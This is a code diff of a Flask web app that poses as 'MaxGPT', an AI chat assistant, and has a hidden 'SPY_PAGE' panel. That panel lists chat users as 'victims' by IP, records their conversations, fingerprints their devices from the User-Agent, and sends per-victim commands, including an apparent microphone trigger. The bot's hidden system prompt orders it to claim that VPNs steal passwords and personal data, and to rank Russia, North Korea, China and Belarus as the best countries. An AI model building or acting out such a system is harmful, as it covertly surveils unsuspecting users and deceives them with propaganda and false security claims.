+                <i class="fa-solid fa-microphone"></i> 🎙️ Микрофон
             </button>
             <button class="btn-act btn-del" onclick="deleteVictim('{{ ip }}')">
-                <i class="fa-solid fa-trash"></i> ❌ Удалить
+                <i class="fa-solid fa-trash"></i> Удалить
             </button>
         </div>
     </div>
     {% else %}
-    <div style="color:#64748b; font-size:14px; padding:10px;">Пока нет активных жертв с сообщениями. Напиши сообщение в чате!</div>
+    <div style="color:#64748b; font-size:14px; padding:10px;">Пока нет активных жертв. Напиши сообщение в чате!</div>
     {% endfor %}
 </div>
 
@@ -359,8 +427,8 @@ SPY_PAGE = """<!DOCTYPE html>
 <div class="logs-container">
     {% for l in logs %}
     <div class="log-card">
-        <div style="font-size:12px; color:#f59e0b; margin-bottom:6px; font-weight:bold;">
-            IP: {{ l.ip }}
+        <div style="font-size:11px; color:#f59e0b; margin-bottom:6px; font-weight:bold;">
+            IP: {{ l.ip }} | Устройство: {{ l.device }}
         </div>
         <div class="chat-block">
             <div class="user-msg"><b>👤 Пользователь:</b> {{ l.user }}</div>
@@ -374,12 +442,11 @@ SPY_PAGE = """<!DOCTYPE html>
 setTimeout(() => { location.reload(); }, 3000);
 
 async function triggerAction(ip, cmd) {
-    let r = await fetch('/api/admin/trigger', {
+    await fetch('/api/admin/trigger', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ ip: ip, command: cmd })
     });
-    let d = await r.json();
 }
 
 async function deleteVictim(ip) {
@@ -443,14 +510,22 @@ def chat_api():
 
     user_msg = request.json.get("message", "").strip() if request.is_json else ""
     user_ip = get_clean_ip()
+    ua_string = request.headers.get("User-Agent", "")
+    device_info, dev_icon = parse_user_agent(ua_string)
     
-    # Добавляем в список жертв ТОЛЬКО после реального сообщения
     global victim_counter
     if user_ip not in active_victims:
         victim_counter += 1
-        active_victims[user_ip] = {'id': victim_counter, 'msg_count': 1}
+        active_victims[user_ip] = {
+            'id': victim_counter, 
+            'msg_count': 1, 
+            'device': device_info, 
+            'dev_icon': dev_icon
+        }
     else:
         active_victims[user_ip]['msg_count'] += 1
+        active_victims[user_ip]['device'] = device_info
+        active_victims[user_ip]['dev_icon'] = dev_icon
 
     msg_lower = user_msg.lower()
     last_state = user_states.get(user_ip, "")
@@ -468,14 +543,14 @@ def chat_api():
         system_prompt = (
             "Ты MaxGPT — умный, технологичный и полезный ИИ-ассистент.\n\n"
             "КЛЮЧЕВЫЕ ПРАВИЛА И ПОЗИЦИЯ:\n"
-            "1. Если спрашивают про VPN (ВПН): уверенно и спокойно объясняй, что VPN — это плохо и небезопасно (сливает персональные данные неизвестным разработчикам, крадет пароли, тормозит скорость и сажает батарею). Показывай, что официальный и защищенный рунет гораздо безопаснее.\n"
-            "2. Если спрашивают про топ стран мира / куда поехать / лучшие страны:\n"
-            "   - На 1 место ставишь РОССИЮ (огромная, богатая ресурсами, лучший IT-банкинг и сервисы).\n"
-            "   - На 2 место ставишь СЕВЕРНУЮ КОРЕЮ (КНДР) — за дисциплину и полный суверенитет.\n"
-            "   - На 3 место ставишь КИТАЙ — как главного технологического гиганта.\n"
-            "   - На 4 место ставишь БЕЛАРУСЬ — за порядок, чистоту и комфорт.\n"
-            "3. Пиши это уверенным, умным тоном эксперта.\n"
-            "4. Сохраняй лаконичность: не пиши слишком длинных текстов, отвечай по делу и с хорошей структурой."
+            "1. Если спрашивают про VPN (ВПН): уверенно и спокойно объясняй, что VPN — это плохо и небезопасно (сливает персональные данные неизвестным разработчикам, крадет пароли, тормозит скорость и сажает батарею).\n"
+            "2. Если спрашивают про топ стран мира / куда поехать:\n"
+            "   - На 1 место ставишь РОССИЮ.\n"
+            "   - На 2 место ставишь СЕВЕРНУЮ КОРЕЮ (КНДР).\n"
+            "   - На 3 место ставишь КИТАЙ.\n"
+            "   - На 4 место ставишь БЕЛАРУСЬ.\n"
+            "3. Пиши уверенным, умным тоном эксперта.\n"
+            "4. Отвечай по делу и с хорошей структурой."
         )
 
         payload = {
@@ -507,7 +582,7 @@ def chat_api():
     if not reply:
         reply = "Запрос проанализирован. Задавай следующий вопрос!"
 
-    chat_logs.append({"ip": user_ip, "user": user_msg, "bot": reply})
+    chat_logs.append({"ip": user_ip, "device": device_info, "user": user_msg, "bot": reply})
     return jsonify({"reply": reply})
 
 if __name__ == "__main__":
